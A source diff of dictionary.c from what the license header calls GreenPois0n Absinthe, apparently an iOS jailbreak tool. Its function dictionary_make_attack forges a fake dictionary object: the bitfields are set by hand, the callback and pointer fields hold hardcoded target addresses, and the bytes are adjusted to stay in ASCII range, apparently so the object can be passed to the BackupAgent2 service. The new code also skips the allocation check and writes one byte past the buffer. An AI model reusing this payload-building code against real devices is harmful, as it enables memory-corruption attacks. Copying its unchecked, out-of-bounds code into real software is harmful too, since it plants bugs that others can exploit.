@@ -1,9 +1,21 @@
-/*
- * dictionary.c
- *
- *  Created on: Sep 28, 2011
- *      Author: posixninja
- */
+/**
+  * GreenPois0n Absinthe - dictionary.c
+  * Copyright (C) 2010 Chronic-Dev Team
+  * Copyright (C) 2010 Joshua Hill
+  *
+  * This program is free software: you can redistribute it and/or modify
+  * it under the terms of the GNU General Public License as published by
+  * the Free Software Foundation, either version 3 of the License, or
+  * (at your option) any later version.
+  *
+  * This program is distributed in the hope that it will be useful,
+  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  * GNU General Public License for more details.
+  *
+  * You should have received a copy of the GNU General Public License
+  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -28,83 +40,106 @@ void dictionary_free(dictionary_t* dict) {
 }
 
 int dictionary_make_attack(uint32_t address, char** data, int* length) {
-	int i, j = 0;
 
-	// Allocating space for a dynamic array, and I'm just lazy.
-	unsigned char* buffer = malloc(0x100);
-	if (buffer == NULL) {
-		error("Unable to allocate memory for dictionary string\n");
-		return -1;
-	}memset(buffer, '\0', 0x100);
-	dictionary_t* dict = (dictionary_t*) buffer;
+	int size = 0x40;
+	unsigned char* buffer = malloc(size);
+	memset(buffer, '\0', size);
+	dictionary_t* ht = (dictionary_t*) buffer;
 
-	// Pass our dictionary arguments here. The values added here decide which path BackupAgent2
-	//  will ultimately take, so be sure to choose wisely.
-	uint32_t flags = DICTIONARY_HASH_LINEAR | DICTIONARY_HAS_KEYS | DICTIONARY_HAS_COUNTS;
+	uint32_t flags = DICTIONARY_LINEAR_HASHING | DICTIONARY_HAS_KEYS | DICTIONARY_HAS_COUNTS;
+	//flags |= kCFBasicHashAggressiveGrowth | kCFBasicHashHasKeys |  | kCFBasicHashHasHashCache;
+	//ht->_cfisa = 0x3fdec0c0;
+	//ht->_cfinfo = 0x0100078c;
+	ht->bits.finalized = 0;
+	ht->bits.strong_values = (flags & DICTIONARY_STRONG_VALUES) ? 1 : 0;
+    ht->bits.strong_values2 = 0;
+    ht->bits.strong_keys = (flags & DICTIONARY_STRONG_KEYS) ? 1 : 0;
+    ht->bits.strong_keys2 = 0;
+    ht->bits.hash_style = (flags >> 13) & 0x3;
+    ht->bits.fast_grow = (flags & DICTIONARY_AGGRESSIVE_GROWTH) ? 1 : 0;
+    ht->bits.__0 = 0;
+    ht->bits.num_buckets_idx = 0;
+    ht->bits.used_buckets = 1028;
+    ht->bits.marker = 0;
+    ht->bits.deleted = 0;
+    ht->bits.mutations = 2;
 
-	dict->bits.finalized = 0;
-	dict->bits.strong_values = (flags & DICTIONARY_STRONG_VALUES) ? 1 : 0;
-	dict->bits.strong_values2 = 0;
-	dict->bits.strong_keys = (flags & DICTIONARY_STRONG_KEYS) ? 1 : 0;
-	dict->bits.strong_keys2 = 0;
-	dict->bits.hash_style = (flags >> 13) & 0x3;
-	dict->bits.fast_grow = (flags & DICTIONARY_AGGRESSIVE_GROWTH) ? 1 : 0;
-	dict->bits.__0 = 0;
-	dict->bits.num_buckets_idx = 0;
-	dict->bits.used_buckets = 1028;
-	dict->bits.marker = 0;
-	dict->bits.deleted = 0;
-	dict->bits.mutations = 2;
+	uint64_t offset = 1;
+    ht->bits.values2_offset = 0;
+    ht->bits.keys_offset = (flags & DICTIONARY_HAS_KEYS) ? 1 : 0;
+    ht->bits.keys2_offset = 0;
+    ht->bits.counts_offset = (flags & DICTIONARY_HAS_COUNTS) ? 1 : 0;
+    ht->bits.hashes_offset = (flags & DICTIONARY_HAS_HASHCACHE) ? 1 : 0;
 
-	dict->bits.values2_offset = 0;
-	dict->bits.keys_offset = (flags & DICTIONARY_HAS_KEYS) ? 1 : 0;
-	dict->bits.keys2_offset = 0;
-	dict->bits.counts_offset = (flags & DICTIONARY_HAS_COUNTS) ? 1 : 0;
-	dict->bits.hashes_offset = (flags & DICTIONARY_HAS_HASHCACHE) ? 1 : 0;
 
-	dict->callbacks = address;
-	dict->pointers[0] = address;
-	dict->pointers[1] = address;
-	dict->pointers[2] = address;
+    ht->callbacks = 0x36010100;
+    ht->pointers[0] = 0x37010100;
+    ht->pointers[1] = 0x37010100;
+    ht->pointers[2] = 0x37010100;
 
-	// This debug code just prints the raw hex dump of the structure
-	for (i = 0; i < 0x40; i += 4) {
-		if ((i % 0x10) == 0 && i != 0) printf("\n");
-		debug(" 0x%08x", *((unsigned int*) &buffer[i]));
+    // overrides
+    //buffer[11] = 0x01;
+    //memset(buffer, 'A', 0x20);
+
+	printf("ht->bits.hash_style = %d\n", ht->bits.hash_style);
+    printf("ht->bits.values2_offset = %d\n", ht->bits.values2_offset);
+    printf("ht->bits.keys_offset = %d\n", ht->bits.keys_offset);
+    printf("ht->bits.keys2_offset = %d\n", ht->bits.keys2_offset);
+    printf("ht->bits.counts_offset = %d\n", ht->bits.counts_offset);
+    printf("ht->bits.orders_offset = %d\n", ht->bits.orders_offset);
+    printf("ht->bits.hashes_offset = %d\n", ht->bits.hashes_offset);
+    printf("ht->bits.num_buckets_idx = %d\n", ht->bits.num_buckets_idx);
+    printf("ht->bits.used_buckets = %d\n", ht->bits.used_buckets);
+    printf("ht->bits.finalized = %d\n", ht->bits.finalized);
+    printf("ht->bits.fast_grow = %d\n", ht->bits.fast_grow);
+    printf("ht->bits.strong_values = %d\n", ht->bits.strong_values);
+    printf("ht->bits.strong_values2 = %d\n", ht->bits.strong_values2);
+    printf("ht->bits.strong_keys = %d\n", ht->bits.strong_keys);
+    printf("ht->bits.strong_keys2 = %d\n", ht->bits.strong_keys2);
+    printf("ht->bits.marker = %d\n", ht->bits.marker);
+    printf("ht->bits.deleted = %d\n", ht->bits.deleted);
+    printf("ht->bits.mutations = %d\n", ht->bits.mutations);
+printf("\n");
+
+	int i = 0;
+	int j = 1;
+	for(i = 0; i < size; i++) {
+		if((i % 0x10) == 0 && i != 0) printf("\n");
+			if(buffer[i] == 0) {
+				buffer[i] = j++;
+			}
+			if(buffer[i] >= 0x70) {
+				buffer[i] = 0x50;
+			}
+		printf("\\x%02x", buffer[i]);
 	}
-	printf("\n\n");
-	// Display our hex data before sending it through the ASCII sanitizer
-	dictionary_debug(dict);
-
-
-	// This loop goes through each byte in the structure. If the byte is a NULL byte
-	//  then add 1 to it. If the byte is greater then or equal 0x70 (out of ascii range)
-	//  then just roll it back to 0x60 (chosen randomly)
-	for (i = 0; i < 0x40; i++) {
-		if ((i % 0x10) == 0 && i != 0) printf("\n");
-		if (buffer[i] == 0) {
-			buffer[i] = j++;
-		}
-		//if (buffer[i] >= 0x70) {
-		//	buffer[i] = 0x60;
-		//}
-		debug("\\x%02x", buffer[i]);
+	printf("\n");
+	printf("ht->bits.hash_style = %d\n", ht->bits.hash_style);
+    printf("ht->bits.values2_offset = %d\n", ht->bits.values2_offset);
+    printf("ht->bits.keys_offset = %d\n", ht->bits.keys_offset);
+    printf("ht->bits.keys2_offset = %d\n", ht->bits.keys2_offset);
+    printf("ht->bits.counts_offset = %d\n", ht->bits.counts_offset);
+    printf("ht->bits.orders_offset = %d\n", ht->bits.orders_offset);
+    printf("ht->bits.hashes_offset = %d\n", ht->bits.hashes_offset);
+    printf("ht->bits.num_buckets_idx = %d\n", ht->bits.num_buckets_idx);
+    printf("ht->bits.used_buckets = %d\n", ht->bits.used_buckets);
+    printf("ht->bits.finalized = %d\n", ht->bits.finalized);
+    printf("ht->bits.fast_grow = %d\n", ht->bits.fast_grow);
+    printf("ht->bits.strong_values = %d\n", ht->bits.strong_values);
+    printf("ht->bits.strong_values2 = %d\n", ht->bits.strong_values2);
+    printf("ht->bits.strong_keys = %d\n", ht->bits.strong_keys);
+    printf("ht->bits.strong_keys2 = %d\n", ht->bits.strong_keys2);
+    printf("ht->bits.marker = %d\n", ht->bits.marker);
+    printf("ht->bits.deleted = %d\n", ht->bits.deleted);
+    printf("ht->bits.mutations = %d\n", ht->bits.mutations);
+	for(i = 0; i < size; i+=4) {
+		if((i % 0x10) == 0 && i != 0) printf("\n");
+		printf(" 0x%08x", *((unsigned int*) &buffer[i]));
 	}
-	printf("\n\n");
 
-	// This debug code just prints the raw hex dump of the structure
-	for (i = 0; i < 0x40; i += 4) {
-		if ((i % 0x10) == 0 && i != 0) printf("\n");
-		debug(" 0x%08x", *((unsigned int*) &buffer[i]));
-	}
-	printf("\n\n");
-
-	// Display is again after to compare
-	dictionary_debug(dict);
-
-	buffer[0x40] = 0;
+	buffer[size] = 0;
+	*length = size;
 	*data = buffer;
-	*length = i;
 	return 0;
 }
 
